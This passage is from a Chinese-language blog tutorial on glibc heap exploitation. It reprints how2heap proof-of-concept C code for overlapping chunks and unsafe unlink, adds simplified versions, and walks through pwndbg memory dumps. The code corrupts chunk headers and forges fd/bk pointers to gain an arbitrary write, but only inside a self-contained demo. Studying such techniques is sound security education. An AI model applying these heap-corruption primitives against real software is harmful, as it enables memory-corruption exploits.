class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">'2'</span>, <span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> evil_chunk_size = <span class="number">0x581</span>;</span><br><span class="line">	<span class="keyword">int</span> evil_region_size = <span class="number">0x580</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n"</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the "size" field of chunk p2</span></span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nNow let's free the chunk p2\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nNow let's allocate another chunk with a size equal to the data\n"</span></span><br><span class="line">	       <span class="string">"size of the chunk p2 injected size\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This malloc will be served from the previously freed chunk that\n"</span></span><br><span class="line">	       <span class="string">"is parked in the unsorted bin which size has been modified by us\n"</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\np4 has been allocated at %p and ends at %p\n"</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p3 starts at %p and ends at %p\n"</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p4 should overlap with p3, in this case p4 includes all p3.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span></span><br><span class="line">		   <span class="string">" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Let's run through an example. Right now, we have:\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nIf we memset(p4, '4', %d), we have:\n"</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">'4'</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>((<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p3));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	*(a<span class="number">-8</span>) = <span class="number">0x61</span>;</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">0x58</span>);</span><br><span class="line">	<span class="built_in">memset</span>(c, <span class="string">'c'</span>, <span class="number">0x58</span>);</span><br><span class="line">	<span class="built_in">memset</span>(b, <span class="string">'b'</span>, <span class="number">0x28</span>);</span><br><span class="line">	assert(<span class="built_in">strstr</span>(c,b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化后程序没有像源码一样申请大的内存块，还在tcache bin的范围内，所以不会并入top chunk。<br>首先申请了两块0x28大小的内存。<br>一个chunks的结构：（in_use状态和free状态）<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/chunk.png" alt></p>
<h3 id="pwndbg调试-1"><a href="#pwndbg调试-1" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p><img src="/2022/04/18/how2heap深入浅出学习堆利用/overlap_chunks1.png" alt><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p a-8</span><br><span class="line"><span class="meta">$</span>3 = 0x555555757298 "1"</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/16gx  0x555555757290</span><br><span class="line">0x555555757290: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555557572a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572c0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555557572d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572f0: 0x0000000000000000      0x0000000000020d11</span><br><span class="line">0x555555757300: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p><img src="/2022/04/18/how2heap深入浅出学习堆利用/overlap_chunks2.png" alt><br>这时候发现，a的chunk_size位置已经被修改了，“合并”成了a+b。free掉它。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> bins</span><br><span class="line">                  top: 0x5555557572f0 (size : 0x20d10) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x5555557572a0</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/16gx 0x555555757290</span><br><span class="line">0x555555757290: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x5555557572a0: 0x0000000555555757      0x7d572e1102e3f7f8</span><br><span class="line">0x5555557572b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572c0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555557572d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572f0: 0x0000000000000000      0x0000000000020d11</span><br><span class="line">0x555555757300: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span> chunks</span><br><span class="line">0x555555757000    0x0         0x290        Used                         </span><br><span class="line">0x555555757290    0x0         0x60         Freed     0x555555757</span><br></pre></td></tr></table></figure></p>
<p>a+b chunk的大小为0x61，存入了tcache bin的第五条链表。再次申请一个0x58大小的chunk，范围也是tcache bin的第五条链表内的，所以会将a+b取出分配给c。<br>这样c的后0x30字节就会和b重叠。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p c</span><br><span class="line"><span class="meta">$</span>4 = 0x5555557572a0 "WWUU\005"</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/16gx 0x555555757290</span><br><span class="line">0x555555757290: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x5555557572a0: 0x0000000555555757      0x0000000000000000</span><br><span class="line">0x5555557572b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572c0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555557572d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572f0: 0x0000000000000000      0x0000000000020d11</span><br><span class="line">0x555555757300: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p><img src="/2022/04/18/how2heap深入浅出学习堆利用/overlap_chunks3.png" alt><br>修改b的话，可以对c的后半部分数据也造成威胁。</p>
<h2 id="unsafe-unlink-glibc2-34"><a href="#unsafe-unlink-glibc2-34" class="headerlink" title="unsafe_unlink_glibc2.34"></a>unsafe_unlink_glibc2.34</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>unlink就是从双向链表中取出一个chunk的函数。chunk在free的时候会进行合并空闲chunk的操作，有向前和向后两种。我们在事先分配的一个chunk中伪造一个空闲chunk——通过修改prev_inuse位来改变prev chunk的状态，再修改fd和bk指针绕过检查，这样高地址的chunk在free的时候就会认为prev chunk是空闲的，从而合并它。合并之后，p的指针会变为p-0x18。</p>
<p>首先，要对inuse chunk和free chunk的结构了解一下。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/chunk.png" alt><br>malloc后返回的地址指向的是不加0x10（10进制的16，即<code>2*sizeof(size_t)</code>）的头部数据的地址，而chunks真实的ptr是包含头部数据的地址，即fast bins等中fd指针（或者其他bins中的bk指针）指向malloc_ptr-0x10。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/unlink_chunks1.png" alt></p>
<p>其次，什么时候会进行unlink？</p>
<ol>
<li>再次进行malloc申请内存的时候<br>在比请求大小大的bins中切割取出chunk<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/unlink_time1.png" alt><br>恰好大小的large bin中取出</li>
<li>malloc_consolidate<br>malloc_consolidate()函数用于将 fast bins 中的 chunk 与其物理相邻的chunk合并，并加入 unsorted bin 中。分为高地址（除top chunk）合并和低地址合并。<br>（我觉得翻译的有问题。就是prev和next，prev在低地址，next在高地址）<br>合并后将当前的chunk_p或者后一个chunk（next_chunk）从其所在bin中unlink出来。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/unlink_time3.png" alt></li>
<li>free<br>如果chunk不是 mmap生成的，并且物理相邻的前一个或者下一个chunk处于空闲状态，就需要进行合并。同样分为高地址（除top chunk）合并和低地址合并两种。<br>只有不是fast bin的情况才会触发unlink，注意这里的合并不是用的malloc_consolidate()函数。<br>合并后将相邻空闲 chunk 从空闲 chunk 链表中unlink。将合并后的 chunk 加入 unsorted bin 的双向循环链表中。如果合并后的 chunk 属于 large bins，将 chunk 的 fd_nextsize 和 bk_nextsize 设置为 NULL，因为在unsorted bin 中这两个字段无用。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/unlink_time2.png" alt></li>
<li>realloc<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/unlink_time4.png" alt></li>
</ol>
<p>最后，unlink检查了哪些东西？<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/unlink_check.png" alt></p>
<ol>
<li>chunk size是否等于next chunk的prev_size</li>
<li>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P。<br>伪造chunk的时候要修改好这两个指针和prev_size，prev_inuse位。<h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 20.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(*(<span class="keyword">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> *pre = (<span class="keyword">size_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	pre[<span class="number">1</span>] = <span class="number">0x31</span>;</span><br><span class="line">	pre[<span class="number">2</span>] = (<span class="keyword">size_t</span>)&amp;pre- <span class="number">0x18</span>;</span><br><span class="line">	pre[<span class="number">3</span>] = (<span class="keyword">size_t</span>)&amp;pre- <span class="number">0x10</span>;</span><br><span class="line">	<span class="keyword">size_t</span> *a = (<span class="keyword">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">	<span class="keyword">size_t</span> *head = a - <span class="number">2</span>;</span><br><span class="line">	head[<span class="number">0</span>] = <span class="number">0x30</span>;</span><br><span class="line">	head[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	assert((<span class="keyword">size_t</span>)pre == (<span class="keyword">size_t</span>)&amp;pre - <span class="number">0x18</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试-2"><a href="#pwndbg调试-2" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>首先分配了一块0x40大小的chunk。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/unlink_gdb1.png" alt><br>然后将它修改，在它之中伪造一个fake_chunk。<br>注意要确保<br><code>pre[1] = 0x31;</code>是size位，填上0x31；pre[2]是fd指针位，pre[3]是bk指针位。如何保证FD-&gt;bk和BK-&gt;fd都指向fake_chunk呢？<br>这里有一个巧妙的构造，我一开始看的时候挺懵的。<br>先看一下修改完之后的效果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p pre</span><br><span class="line">$1 = (size_t *) 0x5555557572a0</span><br><span class="line">pwndbg&gt; p &amp;pre</span><br><span class="line">$2 = (size_t **) 0x7fffffffdae0</span><br><span class="line">pwndbg&gt; x/8gx 0x555555757290</span><br><span class="line">0x555555757290: 0x0000000000000000      0x0000000000000041</span><br><span class="line">0x5555557572a0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555557572b0: 0x00007fffffffdac8      0x00007fffffffdad0</span><br><span class="line">0x5555557572c0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p><img src="/2022/04/18/how2heap深入浅出学习堆利用/unlink_chunk2.png" alt><br>fake_chunk的fd和bk指针存放了两个地址。<br>复习一下malloc_chunk的结构。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */</span><br><span class="line"></span><br><span class="line">  struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>fd、bk存放的地址指向的也是两个malloc_chunk结构体，即FD和BK。<br>看看fake_chunk的这两个地址里是什么。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x00007fffffffdac8</span><br><span class="line">0x7fffffffdac8: 0x00007fffffffdb00      		0x0000000000000001</span><br><span class="line">0x7fffffffdad8: 0x000055555555476b      		0x00005555557572a0(FD-&gt;bk)</span><br><span class="line">0x7fffffffdae8: 0x0000000000000000      		0x00007ffff7dcd000</span><br><span class="line">0x7fffffffdaf8: 0x52094ec5fc3af600      		0x00007fffffffdc18</span><br><span class="line">pwndbg&gt; x/8gx 0x00007fffffffdad0</span><br><span class="line">0x7fffffffdad0: 0x0000000000000001      		0x000055555555476b</span><br><span class="line">0x7fffffffdae0: 0x00005555557572a0(BK-&gt;fd)      0x0000000000000000</span><br><span class="line">0x7fffffffdaf0: 0x00007ffff7dcd000      		0x52094ec5fc3af600</span><br><span class="line">0x7fffffffdb00: 0x00007fffffffdc18      		0x00007ffff7a091b3</span><br></pre></td></tr></table></figure>
